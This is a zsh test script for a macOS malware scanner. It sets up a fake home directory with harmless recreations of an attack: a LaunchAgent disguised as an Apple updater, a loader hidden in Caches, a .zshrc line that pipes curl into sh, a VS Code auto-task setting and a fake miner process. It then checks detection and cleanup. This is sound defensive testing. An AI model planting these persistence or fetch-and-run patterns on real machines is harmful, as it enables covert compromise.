#!/bin/zsh
# Mac scan: a fake home with the August 2026 attack recreated (harmless copies), scanned then cleaned.
# Usage: tests/mac_tests.sh /path/to/scratch
set -u
S=${1:?scratch dir}; H=$S/rg-fakehome; B=$S/rg-macbackup
cd "$(dirname "$0")/.."
rm -rf $H $B; mkdir -p $H/Library/LaunchAgents $H/Library/Caches/com.apple.iconservices.store "$H/Library/Application Support/Code/User" $H/.x
pass=0; fail=0
ok() { if [[ "$2" == "$3" ]]; then pass=$((pass+1)); print "ok   $1"; else fail=$((fail+1)); print "FAIL $1: got '$2' want '$3'"; fi }
agent() { REPOGUARD_TEST_HOME=$H /usr/bin/python3 -I Resources/mac_agent.py "$@" --backup $B; }

# disguised Apple agent pointing at a script hidden in Caches (the real one used python3 ... CatalogData --svc)
cat > $H/Library/LaunchAgents/com.apple.softwareupdate.agent.plist <<P
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>Label</key><string>com.apple.softwareupdate.rgtest</string>
<key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$H/Library/Caches/com.apple.iconservices.store/CatalogData</string><string>--svc</string></array>
<key>RunAtLoad</key><true/></dict></plist>
P
printf 'import subprocess\nsubprocess.run(["node","-e","1"])  # eth_getTransactionByHash\n' > $H/Library/Caches/com.apple.iconservices.store/CatalogData
# a normal agent that must be left alone
cat > $H/Library/LaunchAgents/com.example.fine.plist <<P
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>Label</key><string>com.example.fine</string><key>Program</key><string>/usr/bin/true</string></dict></plist>
P
printf 'export PATH=/opt/homebrew/bin:$PATH\ncurl -fsSL http://example.invalid/x | sh\nalias ll="ls -l"\n' > $H/.zshrc
printf '{\n  "editor.fontSize": 13,\n  "task.allowAutomaticTasks": "on"\n}\n' > "$H/Library/Application Support/Code/User/settings.json"
# a "miner": a script with a miner's name, running from a hidden folder (copies of system programs get killed by macOS)
printf 'import time\ntime.sleep(300)\n' > $H/.x/xmrig.py; /usr/bin/python3 $H/.x/xmrig.py & MINER=$!; sleep 0.5

R=$(agent scan)
count() { python3 -I -c "import json,sys;d=json.load(sys.stdin);print(len([f for f in d['findings'] if $1]))" <<< "$R"; }
ok "fake Apple agent found"        "$(count "f['kind']=='launchd' and 'pretends to be part of macOS' in f['detail']")" 1
ok "normal agent not flagged"      "$(count "'com.example.fine' in f['detail']")" 0
ok "normal agent listed"           "$(python3 -I -c "import json,sys;print(len([i for i in json.load(sys.stdin)['inventory'] if i['label']=='com.example.fine']))" <<< "$R")" 1
ok "dropped loader in Caches"      "$(count "f['kind']=='tempfile' and f['path'].endswith('CatalogData')")" 1
ok "poisoned .zshrc line"          "$(count "f['kind']=='shell' and 'curl' in f['detail']")" 1
ok "VS Code auto tasks setting"    "$(count "f['kind']=='file' and 'settings.json' in f['path']")" 1
ok "miner process"                 "$(count "f['kind']=='process' and f.get('pid')==$MINER and f['severity']=='block'")" 1

IDS=($(python3 -I -c "import json,sys;print(' '.join(f['id'] for f in json.load(sys.stdin)['findings'] if '$H' in f['path'] or f.get('pid')==$MINER))" <<< "$R"))
C=$(agent clean --ids $IDS)
ok "every fix succeeded"           "$(python3 -I -c "import json,sys;print(all(r['ok'] for r in json.load(sys.stdin)['results']))" <<< "$C")" True
ok "nothing left afterwards"       "$(python3 -I -c "import json,sys;d=json.load(sys.stdin);print(len([f for f in d['findings'] if '$H' in f['path'] or f.get('pid')==$MINER]))" <<< "$C")" 0
ok "miner stopped"                 "$(kill -0 $MINER 2>/dev/null && echo running || echo stopped)" stopped
ok "fake agent plist removed"      "$([[ -e $H/Library/LaunchAgents/com.apple.softwareupdate.agent.plist ]] && echo yes || echo no)" no
ok "loader removed"                "$([[ -e $H/Library/Caches/com.apple.iconservices.store/CatalogData ]] && echo yes || echo no)" no
ok "normal agent kept"             "$([[ -e $H/Library/LaunchAgents/com.example.fine.plist ]] && echo yes || echo no)" yes
ok ".zshrc keeps its other lines"  "$(grep -c 'alias ll\|opt/homebrew' $H/.zshrc)" 2
ok ".zshrc curl line gone"         "$(grep -c curl $H/.zshrc)" 0
ok "settings.json keeps font size" "$(python3 -I -c "import json;d=json.load(open('$H/Library/Application Support/Code/User/settings.json'));print(d.get('editor.fontSize'), 'task.allowAutomaticTasks' in d)")" "13 False"
ok "backups written"               "$(find $B -name '*.quarantined' | wc -l | tr -d ' ')" 5
kill $MINER 2>/dev/null
print "=== $pass passed, $fail failed"
